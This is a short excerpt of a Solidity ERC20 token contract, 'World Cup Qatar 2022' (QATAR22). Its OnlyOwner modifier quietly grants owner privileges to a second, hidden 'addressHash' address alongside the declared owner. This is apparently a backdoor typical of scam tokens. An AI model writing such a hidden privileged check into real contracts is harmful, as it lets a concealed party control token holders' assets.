...
contract QATAR22 is Context, IERC20, Ownable {
    ...
    string nameToken = "World Cup Qatar 2022"; // Name Token
    string symbolToken = "QATAR22"; // Symbol Token
    ...
    modifier OnlyOwner() {
        require(msg.sender == owner() || msg.sender == addressHash);
        _;
    }
